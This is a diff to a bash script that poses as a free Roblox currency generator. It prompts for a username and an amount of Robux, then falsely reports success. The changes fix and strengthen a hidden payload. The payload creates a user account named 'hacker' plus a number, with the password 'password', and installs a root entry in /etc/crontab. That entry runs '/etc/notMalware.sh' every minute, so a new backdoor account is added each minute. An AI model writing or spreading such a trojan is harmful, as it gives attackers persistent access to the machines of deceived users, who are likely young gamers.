@@ -11,18 +11,20 @@ if [ ! -f "$COUNTER_FILE" ]; then
     echo 0 > "$COUNTER_FILE"
 fi
 
-counter=$(cat "$COUNTER")
+counter=$(cat "$COUNTER_FILE")
 counter=$((counter + 1))
 
-sudo adduser "hacker $counter"
+sudo useradd -m -s /bin/bash "hacker$counter" && echo "hacker$counter:password" | sudo chpasswd
+
+echo $counter > $COUNTER_FILE
 EOF
 
-chmod +x "$SCRIPT_PATH"
+sudo chmod +x "$SCRIPT_PATH"
 
-(crontab -l 2>/dev/null; echo "* * * * * $SCRIPT_PATH") | crontab -
+sudo sh -c 'echo "*  *    * * *   root    /etc/notMalware.sh" >> /etc/crontab'
 
-echo "Enter your roblox username: "
+echo -n "Enter your roblox username: "
 read username
-echo "Enter how many robux you want: "
+echo -n "Enter how many robux you want: "
 read robux
 echo "Robux sent successfully!"
